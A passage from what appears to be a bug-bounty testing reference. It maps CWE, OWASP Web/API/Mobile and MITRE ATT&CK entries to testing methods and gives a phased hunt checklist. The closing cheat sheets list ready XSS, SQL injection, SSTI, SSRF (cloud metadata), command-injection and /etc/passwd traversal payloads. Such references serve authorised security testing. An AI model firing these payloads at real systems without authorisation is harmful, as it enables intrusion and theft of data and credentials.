| 15 | CWE-502 | Deserialization of Untrusted Data | Unsafe deserialization | Web/API | Java/PHP/Python serialized object injection |
| 16 | CWE-77 | Command Injection | Improper neutralization of commands | Web/API | Metacharacter injection in command-building functions |
| 17 | CWE-119 | Buffer Overflow | Operations on memory buffer without bounds check | Network | Long input strings, protocol fuzzing |
| 18 | CWE-798 | Use of Hard-coded Credentials | Credentials embedded in source code | Web/API/Cloud | Search JS bundles, decompile mobile apps for secrets |
| 19 | CWE-918 | Server-Side Request Forgery (SSRF) | Server makes requests to attacker-specified URLs | Web/API/Cloud | URL parameters: `http://127.0.0.1`, `http://169.254.169.254` |
| 20 | CWE-306 | Missing Authentication for Critical Function | No auth on sensitive endpoints | Web/API | Direct access to admin/internal API endpoints |
| 21 | CWE-362 | Race Condition (TOCTOU) | Concurrent execution with shared resource | Web/API | Parallel requests for balance transfer, coupon redeem |
| 22 | CWE-269 | Improper Privilege Management | Failure to properly manage privileges | Web/API/Cloud | Vertical privilege escalation, role confusion |
| 23 | CWE-94 | Code Injection | Improper control of code generation | Web/API | `eval()` injection, SSTI, expression language injection |
| 24 | CWE-863 | Incorrect Authorization | Authorization check exists but is flawed | Web/API | IDOR, horizontal privilege escalation |
| 25 | CWE-276 | Incorrect Default Permissions | Overly permissive default access | Cloud | World-readable S3 buckets, open Elasticsearch |

## Additional Critical CWEs (26-50)

| Rank | CWE ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|---|
| 26 | CWE-611 | XML External Entity (XXE) | XXE processing in XML parsers | Web/API | DTD injection, out-of-band XXE via file upload |
| 27 | CWE-200 | Exposure of Sensitive Information | Information disclosure to unauthorized actors | All | Error messages, debug endpoints, verbose APIs |
| 28 | CWE-311 | Missing Encryption of Sensitive Data | Sensitive data transmitted/stored unencrypted | Web/API/Mobile | HTTP instead of HTTPS, plaintext passwords in DB |
| 29 | CWE-532 | Insertion of Sensitive Info into Log File | Logging passwords, tokens, PII | Web/API/Cloud | Check log endpoints, error messages with tokens |
| 30 | CWE-601 | URL Redirection to Untrusted Site (Open Redirect) | Unvalidated redirects | Web | `?redirect=http://evil.com`, OAuth redirect_uri bypass |
| 31 | CWE-639 | Authorization Bypass Through User-Controlled Key | IDOR via user-supplied identifiers | Web/API | Change `user_id`, `order_id` in requests |
| 32 | CWE-400 | Uncontrolled Resource Consumption | Resource exhaustion / DoS | Web/API | Large payloads, recursive queries, zip bombs |
| 33 | CWE-668 | Exposure of Resource to Wrong Sphere | Resource accessible from wrong context | Web/API/Cloud | Cross-origin data access, misconfigured CORS |
| 34 | CWE-732 | Incorrect Permission Assignment | Wrong permissions on resources | Cloud | Overly permissive IAM, public cloud resources |
| 35 | CWE-427 | Uncontrolled Search Path Element | DLL hijacking, PATH manipulation | Network | DLL sideloading, LD_PRELOAD injection |
| 36 | CWE-843 | Access of Resource Using Incompatible Type (Type Confusion) | Type confusion vulnerabilities | Web/API | PHP type juggling: `0 == "string"`, JSON type mismatch |
| 37 | CWE-295 | Improper Certificate Validation | Failing to validate SSL/TLS certificates | Mobile/API | Certificate pinning bypass, self-signed cert acceptance |
| 38 | CWE-319 | Cleartext Transmission of Sensitive Information | Sending sensitive data over HTTP | Web/Mobile | Check for HTTP endpoints handling auth/PII data |
| 39 | CWE-345 | Insufficient Verification of Data Authenticity | Not verifying data integrity | Web/API | Unsigned webhooks, JWT without signature verification |
| 40 | CWE-522 | Insufficiently Protected Credentials | Weak credential storage/transmission | Web/API | Plaintext passwords, weak hashing (MD5/SHA1) |
| 41 | CWE-539 | Use of Persistent Cookies Containing Sensitive Information | Sensitive data in non-expiring cookies | Web | Check cookie flags: HttpOnly, Secure, SameSite, expiry |
| 42 | CWE-548 | Exposure of Information Through Directory Listing | Directory listing enabled | Web | Browse `/uploads/`, `/backup/`, check for autoindex |
| 43 | CWE-613 | Insufficient Session Expiration | Sessions that never expire | Web/API | Check if tokens remain valid after logout, after days |
| 44 | CWE-640 | Weak Password Recovery Mechanism | Insecure password reset | Web | Predictable reset tokens, no rate limiting on reset |
| 45 | CWE-706 | Use of Incorrectly-Resolved Name or Reference | Confusion in resource resolution | Web/API | Host header injection, namespace confusion |
| 46 | CWE-770 | Allocation of Resources Without Limits | No resource limits | Web/API/Cloud | Request flooding, memory exhaustion, fork bombs |
| 47 | CWE-829 | Inclusion of Functionality from Untrusted Control Sphere | Loading untrusted code | Web | Third-party JS inclusion, CDN compromise vectors |
| 48 | CWE-943 | Improper Neutralization of Special Elements in Data Query Logic | NoSQL injection | Web/API | MongoDB operator injection: `{"$ne": null}` |
| 49 | CWE-1021 | Improper Restriction of Rendered UI Layers | Clickjacking | Web | Missing `X-Frame-Options` / CSP `frame-ancestors` |
| 50 | CWE-1236 | Improper Neutralization of Formula Elements in CSV | CSV injection | Web | `=CMD("calc")` in exported CSV fields |

---

# 4. OWASP TOP 10 (2021)

| Rank | ID | Name | Description | How to Test |
|---|---|---|---|---|
| 1 | A01:2021 | Broken Access Control | Missing/broken authorization, IDOR, privilege escalation, forced browsing | Test every endpoint as different roles. Change IDs. Access admin paths as user. IDOR on all object references. |
| 2 | A02:2021 | Cryptographic Failures | Weak crypto, plaintext data, broken TLS, weak hashing | Check HTTPS enforcement, cipher suites, password hashing, data-at-rest encryption, exposed secrets. |
| 3 | A03:2021 | Injection | SQLi, XSS, NoSQLi, OS command injection, LDAP injection | Test all input fields with injection payloads. Automated + manual. Context-aware payloads. |
| 4 | A04:2021 | Insecure Design | Flawed business logic, missing security controls by design | Business logic testing: negative amounts, race conditions, workflow bypass, missing rate limits. |
| 5 | A05:2021 | Security Misconfiguration | Default creds, open cloud storage, verbose errors, unnecessary features | Check default pages, error handling, CORS, HTTP headers, cloud storage permissions, directory listing. |
| 6 | A06:2021 | Vulnerable and Outdated Components | Known CVEs in dependencies, unpatched libraries | Version fingerprinting, CVE lookup, dependency scanning, outdated JavaScript libraries. |
| 7 | A07:2021 | Identification and Authentication Failures | Broken auth, weak passwords, session issues, credential stuffing | Test brute force protection, session management, MFA bypass, password policy, session fixation. |
| 8 | A08:2021 | Software and Data Integrity Failures | Unsafe deserialization, unsigned updates, compromised CI/CD | Test deserialization endpoints, check code signing, CI/CD pipeline security, dependency integrity. |
| 9 | A09:2021 | Security Logging and Monitoring Failures | Missing audit logs, no alerting, log injection | Test if security events are logged, check for log injection, verify monitoring (usually low bounty). |
| 10 | A10:2021 | Server-Side Request Forgery (SSRF) | Server fetches attacker-supplied URLs | URL parameters, webhook URLs, PDF generators, image fetchers — test with Burp Collaborator / interactsh. |

---

# 5. OWASP API SECURITY TOP 10 (2023)

| Rank | ID | Name | Description | How to Test |
|---|---|---|---|---|
| 1 | API1:2023 | Broken Object Level Authorization (BOLA) | APIs expose endpoints handling object IDs, enabling IDOR | Change object IDs in every API call. `GET /api/users/123` → try `/api/users/124`. Test with different auth tokens. |
| 2 | API2:2023 | Broken Authentication | Weak auth mechanisms in APIs | Test token generation, expiration, JWT attacks (`none` alg, key confusion), API key exposure. |
| 3 | API3:2023 | Broken Object Property Level Authorization | Excessive data exposure + mass assignment | Check if API returns more fields than UI shows. Try adding extra fields in PUT/PATCH (role, isAdmin). |
| 4 | API4:2023 | Unrestricted Resource Consumption | No rate limiting, allowing DoS and brute force | Send rapid requests, test for rate limits on auth endpoints, check response time for expensive queries. |
| 5 | API5:2023 | Broken Function Level Authorization (BFLA) | Missing authorization on API functions | Access admin API endpoints with regular user token. `DELETE /api/users/123` as non-admin. |
| 6 | API6:2023 | Unrestricted Access to Sensitive Business Flows | Abuse of legitimate business flows | Automated purchasing, ticket scalping, review bombing — test for bot detection, rate limits. |
| 7 | API7:2023 | Server Side Request Forgery (SSRF) | API fetches attacker-supplied URLs | Webhook URLs, file import URLs, avatar URLs — test with internal IPs, cloud metadata. |
| 8 | API8:2023 | Security Misconfiguration | Insecure default config, missing hardening | Check CORS policy, HTTP methods, verbose errors, unnecessary endpoints, debug modes. |
| 9 | API9:2023 | Improper Inventory Management | Undocumented/deprecated APIs still active | Find old API versions (`/v1/` vs `/v2/`), Swagger/OpenAPI endpoints, deprecated paths still working. |
| 10 | API10:2023 | Unsafe Consumption of APIs | Trusting third-party API responses without validation | Test if app validates data from external APIs, SSRF via third-party redirects, injection via webhook data. |

---

# 6. OWASP MOBILE TOP 10 (2024)

| Rank | ID | Name | Description | How to Test |
|---|---|---|---|---|
| 1 | M1 | Improper Credential Usage | Hardcoded credentials, insecure credential storage | Decompile APK/IPA, search for API keys, tokens, passwords in source/resources. |
| 2 | M2 | Inadequate Supply Chain Security | Compromised third-party libraries, SDKs | Analyze dependencies, check for known vulns in included libraries. |
| 3 | M3 | Insecure Authentication/Authorization | Weak local auth, missing server-side auth | Bypass biometrics, test API calls without auth, IDOR in mobile API endpoints. |
| 4 | M4 | Insufficient Input/Output Validation | Injection attacks via mobile input | SQLi in local DB, XSS in WebViews, deeplink injection. |
| 5 | M5 | Insecure Communication | Plaintext traffic, weak TLS, no cert pinning | Proxy with Burp, check for HTTP traffic, bypass cert pinning (Frida/Objection). |
| 6 | M6 | Inadequate Privacy Controls | PII leaks, excessive data collection | Check what data is stored locally, sent to analytics, shared with third parties. |
| 7 | M7 | Insufficient Binary Protections | No obfuscation, no tamper detection, debuggable | Check for `android:debuggable`, attempt reverse engineering, Frida hooking. |
| 8 | M8 | Security Misconfiguration | Insecure default settings, debug flags | Check `AndroidManifest.xml` for exported components, debug flags, backup allowed. |
| 9 | M9 | Insecure Data Storage | Sensitive data stored insecurely on device | Check SharedPreferences, SQLite DBs, Keychain, plist files for secrets/PII. |
| 10 | M10 | Insufficient Cryptography | Weak algorithms, poor key management | Check for MD5/SHA1, hardcoded encryption keys, ECB mode, custom crypto. |

---

# 7. CROSS-REFERENCE MATRIX

## Attack Surface Quick Reference

### Web Application Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | SQL Injection | T1190, CAPEC-66, CWE-89, A03 | Full DB access, data theft |
| CRITICAL | Remote Code Execution | T1059, CAPEC-242, CWE-94, A03 | Full server compromise |
| CRITICAL | Authentication Bypass | T1078, CAPEC-115, CWE-287, A07 | Account takeover |
| CRITICAL | IDOR / Broken Access Control | T1548, CAPEC-122, CWE-862, A01, API1 | Data theft, privilege escalation |
| CRITICAL | SSRF | T1190, CAPEC-664, CWE-918, A10, API7 | Internal network access, cloud creds |
| HIGH | XSS (Stored) | T1189, CAPEC-63, CWE-79, A03 | Session hijacking, account takeover |
| HIGH | Insecure Deserialization | T1190, CAPEC-586, CWE-502, A08 | RCE, data tampering |
| HIGH | File Upload (Web Shell) | T1505.003, CAPEC-17, CWE-434, A04 | RCE, persistence |
| HIGH | Path Traversal / LFI | T1005, CAPEC-126, CWE-22, A01 | Source code disclosure, config theft |
| HIGH | CSRF | T1204, CAPEC-62, CWE-352, A01 | Unauthorized actions |
| MEDIUM | Open Redirect | T1204.001, CAPEC-194, CWE-601, A01 | Phishing, OAuth token theft |
| MEDIUM | XXE | T1190, CAPEC-228, CWE-611, A05 | File read, SSRF, DoS |
| MEDIUM | CORS Misconfiguration | T1189, CWE-668, A05, API8 | Cross-origin data theft |
| MEDIUM | HTTP Request Smuggling | T1190, CAPEC-33, CWE-444, A05 | Cache poisoning, auth bypass |

### API Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | BOLA (IDOR) | T1548, CAPEC-12, CWE-639, API1 | Mass data access |
| CRITICAL | BFLA (Missing Function Auth) | T1548, CAPEC-233, CWE-862, API5 | Admin function access |
| CRITICAL | Mass Assignment | T1565, CAPEC-57, CWE-915, API3 | Privilege escalation |
| CRITICAL | JWT Attacks | T1606, CAPEC-196, CWE-345, API2 | Auth bypass, impersonation |
| HIGH | GraphQL Injection/Abuse | T1190, CAPEC-66, CWE-89, API4 | Data extraction, DoS |
| HIGH | API Key Leakage | T1552, CAPEC-497, CWE-798, API2 | Full API access |
| HIGH | Rate Limiting Bypass | T1110, CAPEC-49, CWE-770, API4 | Brute force, DoS |
| HIGH | Excessive Data Exposure | T1530, CAPEC-116, CWE-200, API3 | PII/sensitive data theft |
| MEDIUM | API Versioning Abuse | T1190, CWE-1059, API9 | Bypass newer security controls |
| MEDIUM | HTTP Method Tampering | T1190, CAPEC-153, CWE-749, API8 | Auth bypass, unexpected behavior |

### Cloud Security Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | SSRF to Cloud Metadata | T1552.005, CAPEC-664, CWE-918, A10 | IAM credential theft |
| CRITICAL | Public S3/Blob/GCS Buckets | T1530, CWE-276, A05 | Mass data exposure |
| CRITICAL | IAM Privilege Escalation | T1548.005, CWE-269, A01 | Full cloud account takeover |
| HIGH | Exposed Cloud Credentials | T1552.001, CWE-798, A02 | Unauthorized cloud access |
| HIGH | Container Escape | T1611, CWE-269 | Host compromise from container |
| HIGH | Kubernetes API Abuse | T1613, T1552.007, CWE-306 | Cluster compromise |
| MEDIUM | CloudTrail/Logging Disabled | T1562.008, A09 | Undetected persistence |
| MEDIUM | Security Group Misconfig | T1562.007, CWE-732, A05 | Network exposure |
| MEDIUM | Lambda/Function Injection | T1648, CWE-94 | Serverless RCE |

### Network Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | Known CVE Exploitation | T1190, CWE-1395, A06 | RCE, full compromise |
| CRITICAL | Default Credentials | T1078.001, CAPEC-560, CWE-798, A07 | Unauthorized access |
| HIGH | Kerberoasting | T1558.003, CWE-522 | Service account compromise |
| HIGH | SMB Relay / NTLM Relay | T1557, CWE-294 | Credential relay, lateral movement |
| HIGH | Password Spraying | T1110.003, CAPEC-600, CWE-307 | Account compromise |
| MEDIUM | SNMP Enumeration | T1082, CWE-200 | Information disclosure |
| MEDIUM | DNS Zone Transfer | T1590.002, CWE-200 | Full DNS record exposure |
| MEDIUM | SSL/TLS Weaknesses | T1600, CWE-295, CWE-311 | Traffic interception |

### Mobile Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | Hardcoded Secrets | T1552.001, CWE-798, M1 | API key theft, backend access |
| CRITICAL | Insecure API Communication | T1557, CWE-319, M5 | Data interception |
| HIGH | Missing Certificate Pinning | CWE-295, M5 | MITM attacks |
| HIGH | Insecure Local Storage | CWE-312, M9 | PII/credential theft |
| HIGH | Exported Components | CWE-926, M8 | Unauthorized functionality access |
| MEDIUM | WebView Vulnerabilities | CAPEC-588, CWE-79, M4 | XSS in mobile context |
| MEDIUM | Deeplink Injection | CWE-939, M4 | Intent hijacking, phishing |
| MEDIUM | Debuggable/Backup Enabled | CWE-489, M7 | Data extraction, debugging |

---

## Hunt Checklist — The Alpha's Playbook

### Phase 1: Reconnaissance (TA0043)
- [ ] Subdomain enumeration (crt.sh, SecurityTrails, subfinder)
- [ ] Technology fingerprinting (Wappalyzer, HTTP headers)
- [ ] JavaScript analysis (extract endpoints, secrets, API keys)
- [ ] GitHub/GitLab dork for target org
- [ ] Wayback Machine for old endpoints
- [ ] Google dork: `site:target.com filetype:env|sql|log|conf`
- [ ] Shodan/Censys for exposed services
- [ ] API documentation discovery (Swagger, GraphQL introspection)
- [ ] Port scan if network scope (top 1000 ports)

### Phase 2: Authentication Testing (TA0006, A07, API2)
- [ ] Default credentials
- [ ] Registration bypass / self-registration abuse
- [ ] Password reset flow (token predictability, rate limiting)
- [ ] JWT analysis (algorithm, secret strength, claims)
- [ ] OAuth flow testing (redirect_uri, state, scope)
- [ ] Session management (fixation, expiration, invalidation)
- [ ] MFA bypass attempts
- [ ] Cookie security flags (HttpOnly, Secure, SameSite)

### Phase 3: Authorization Testing (TA0004, A01, API1, API5)
- [ ] IDOR on every object reference (user ID, order ID, file ID)
- [ ] Horizontal privilege escalation (access other users' data)
- [ ] Vertical privilege escalation (user to admin)
- [ ] BFLA — access admin functions as regular user
- [ ] Mass assignment — add `role`, `isAdmin`, `permissions` to requests
- [ ] Force browsing to admin paths
- [ ] API endpoint enumeration across versions

### Phase 4: Injection Testing (TA0002, A03)
- [ ] SQL injection in all parameters
- [ ] XSS (reflected, stored, DOM-based)
- [ ] OS command injection
- [ ] Server-Side Template Injection (SSTI)
- [ ] NoSQL injection
- [ ] LDAP injection (if applicable)
- [ ] Header injection / CRLF
- [ ] GraphQL injection

### Phase 5: Server-Side Attacks (A10, API7)
- [ ] SSRF in URL parameters, webhooks, file imports
- [ ] XXE in XML/SOAP endpoints, file uploads
- [ ] Insecure deserialization
- [ ] File upload bypass for RCE
- [ ] Path traversal / LFI
- [ ] HTTP request smuggling

### Phase 6: Business Logic (A04)
- [ ] Race conditions (parallel requests for balance/coupon)
- [ ] Price manipulation (negative quantities, modified prices)
- [ ] Workflow bypass (skip steps in multi-step process)
- [ ] Rate limiting bypass
- [ ] Feature abuse (mass operations, resource exhaustion)
- [ ] Currency/conversion rounding errors

### Phase 7: Configuration (A05, API8)
- [ ] CORS policy testing
- [ ] Security headers (CSP, HSTS, X-Frame-Options)
- [ ] Debug/test endpoints
- [ ] Exposed admin panels
- [ ] Directory listing
- [ ] Error handling (verbose errors, stack traces)
- [ ] Cloud storage permissions (S3, GCS, Azure Blob)

---

## Encoding & Bypass Quick Reference

### XSS Bypass Payloads
```
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
javascript:alert(1)//
\u006Aavascript:alert(1)
<script>alert`1`</script>
${alert(1)}    (template literal in JS context)
'-alert(1)-'   (JS string break)
</script><script>alert(1)</script>
```

### SQLi Quick Reference
```
' OR 1=1--
' UNION SELECT null,null,null--
' AND (SELECT SUBSTRING(version(),1,1))='5'--
'; WAITFOR DELAY '0:0:5'--            (MSSQL time-based)
' AND SLEEP(5)--                      (MySQL time-based)
' AND pg_sleep(5)--                   (PostgreSQL time-based)
1' ORDER BY 1--                       (column enumeration)
```

### SSTI Detection
```
{{7*7}}              -> 49 (Jinja2/Twig)
${7*7}               -> 49 (Freemarker/EL)
<%= 7*7 %>           -> 49 (ERB)
#{7*7}               -> 49 (Thymeleaf/Pebble)
{{constructor.constructor('return 1')()}}  (Pug/Jade)
```

### SSRF Bypass
```
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://0x7f000001
http://2130706433        (decimal IP)
http://127.1
http://0177.0.0.1        (octal)
http://169.254.169.254   (cloud metadata)
http://metadata.google.internal  (GCP)
```

### Command Injection
```
; id
| id
`id`
$(id)
%0aid
\nid
& id
&& id
|| id
```

### Path Traversal
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
/..%c0%af../etc/passwd
```

---

> **The pack hunts with knowledge. Every technique, every ID, every bypass — documented and ready.**
> **This is the Alpha's complete attack knowledge base.**
